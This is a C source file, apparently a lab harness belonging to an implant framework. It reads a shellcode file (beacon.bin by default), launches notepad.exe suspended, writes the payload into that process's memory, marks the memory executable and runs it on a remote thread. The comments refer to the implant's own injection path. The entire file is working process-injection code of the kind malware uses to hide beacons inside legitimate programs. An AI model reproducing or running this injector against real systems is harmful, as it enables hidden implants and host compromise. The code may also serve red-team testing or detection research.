/*
 * Lab harness: map beacon.bin at an OS-chosen base and run it (same contract as
 * windows_noldr inject / hollow_rs): VirtualAllocEx → WriteProcessMemory → execute
 * at offset 0.
 *
 * CreateRemoteThread is used instead of QueueUserAPC: Notepad's UI thread is not
 * alertable. The implant's own inject path uses NtAlertResumeThread, which is.
 *
 * Usage: shellcode_runner.exe [path\to\beacon.bin]
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>

#ifndef CREATE_SUSPENDED
#  define CREATE_SUSPENDED 0x00000004
#endif

#define PIC_STACK_SIZE ((SIZE_T)(4u * 1024u * 1024u))

static unsigned char *read_all(const char *path, size_t *out_n)
{
    FILE *f = NULL;
    unsigned char *buf = NULL;
    long sz;

    *out_n = 0;
    f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "shellcode_runner: cannot open %s\n", path);
        return NULL;
    }
    if (fseek(f, 0, SEEK_END) != 0) {
        fprintf(stderr, "shellcode_runner: seek error %s\n", path);
        fclose(f);
        return NULL;
    }
    sz = ftell(f);
    if (sz < 1) {
        fprintf(stderr, "shellcode_runner: empty or invalid size %s\n", path);
        fclose(f);
        return NULL;
    }
    if (fseek(f, 0, SEEK_SET) != 0) {
        fprintf(stderr, "shellcode_runner: seek error %s\n", path);
        fclose(f);
        return NULL;
    }
    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) {
        fprintf(stderr, "shellcode_runner: out of memory\n");
        fclose(f);
        return NULL;
    }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        fprintf(stderr, "shellcode_runner: read error %s\n", path);
        free(buf);
        fclose(f);
        return NULL;
    }
    fclose(f);
    *out_n = (size_t)sz;
    return buf;
}

static void fail_child(PROCESS_INFORMATION *pi, LPVOID remote, unsigned char *shellcode)
{
    if (remote)
        VirtualFreeEx(pi->hProcess, remote, 0, MEM_RELEASE);
    TerminateProcess(pi->hProcess, 1);
    CloseHandle(pi->hThread);
    CloseHandle(pi->hProcess);
    free(shellcode);
}

int main(int argc, char **argv)
{
    const char *path = (argc > 1) ? argv[1] : "beacon.bin";
    size_t n = 0;
    unsigned char *shellcode = read_all(path, &n);
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    LPVOID remote = NULL;
    SIZE_T written = 0;
    HANDLE inj_th;
    DWORD old_prot = 0;

    if (!shellcode)
        return 1;

    ZeroMemory(&si, sizeof si);
    si.cb = sizeof si;
    ZeroMemory(&pi, sizeof pi);

    {
        char cmdline[] = "C:\\Windows\\System32\\notepad.exe";
        if (!CreateProcessA(NULL, cmdline, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si,
                            &pi)) {
            fprintf(stderr, "shellcode_runner: CreateProcessA failed (%lu)\n",
                    (unsigned long)GetLastError());
            free(shellcode);
            return 1;
        }
    }

    remote = VirtualAllocEx(pi.hProcess, NULL, n, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remote) {
        fprintf(stderr, "shellcode_runner: VirtualAllocEx failed (%lu)\n",
                (unsigned long)GetLastError());
        fail_child(&pi, NULL, shellcode);
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, remote, shellcode, n, &written) || written != n) {
        fprintf(stderr, "shellcode_runner: WriteProcessMemory failed (%lu)\n",
                (unsigned long)GetLastError());
        fail_child(&pi, remote, shellcode);
        return 1;
    }
    free(shellcode);
    shellcode = NULL;

    if (!VirtualProtectEx(pi.hProcess, remote, n, PAGE_EXECUTE_READWRITE, &old_prot)) {
        fprintf(stderr, "shellcode_runner: VirtualProtectEx failed (%lu)\n",
                (unsigned long)GetLastError());
        fail_child(&pi, remote, NULL);
        return 1;
    }
    FlushInstructionCache(pi.hProcess, remote, (SIZE_T)n);

    inj_th = CreateRemoteThread(pi.hProcess, NULL, PIC_STACK_SIZE,
                                (LPTHREAD_START_ROUTINE)(void *)remote, NULL, 0, NULL);
    if (!inj_th) {
        fprintf(stderr, "shellcode_runner: CreateRemoteThread failed (%lu)\n",
                (unsigned long)GetLastError());
        fail_child(&pi, remote, NULL);
        return 1;
    }
    CloseHandle(inj_th);

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        fprintf(stderr, "shellcode_runner: ResumeThread failed (%lu)\n",
                (unsigned long)GetLastError());
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    printf("shellcode_runner: %zu bytes at %p (OS base, entry +0), 4MiB stack.\n", n, remote);
    fflush(stdout);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
